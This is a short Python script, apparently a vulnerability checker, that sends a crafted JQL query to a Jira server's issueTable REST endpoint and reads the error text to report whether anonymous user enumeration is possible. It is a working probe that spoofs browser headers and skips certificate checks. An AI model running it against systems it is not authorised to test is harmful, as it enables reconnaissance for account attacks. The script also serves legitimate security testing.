import requests
import httplib2
from sys import argv, exit

NOT_VULNERABLE = "cannot be called as anonymous user"
VULNERABE = "the user does not exist"


def check(url):
    user = "Iamnot.validuser"
    post_url_format = "{}/rest/issueNav/1/issueTable"
    post_data = {'jql' : "project in projectsLeadByUser(\"{}\")".format(user)}
    post_headers = {
    "Connection":"Close",
    "User-Agent" : "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Sec-Fetch-User" : "?1",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "Sec-Fetch-Site":"none",
    "Sec-Fetch-Mode":"navigate",
    "X-Atlassian-Token":"no-check",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"en-US,en;q=0.9"}

    s = requests.session()
    s.headers.update(post_headers)
    r = s.post(post_url_format.format(url),data=post_data,verify=False)
    
    if VULNERABE in r.text:
        print("[+] '{}' is vulnerable to user enuemration.".format(url))
    elif NOT_VULNERABLE in r.text:
        print("[-] '{}' not vulnerable.".format(url))
    else:
        print("[-] Got invalid '{}' response.".format(r.status_code))


if __name__ == "__main__":
    
    check(argv[1])
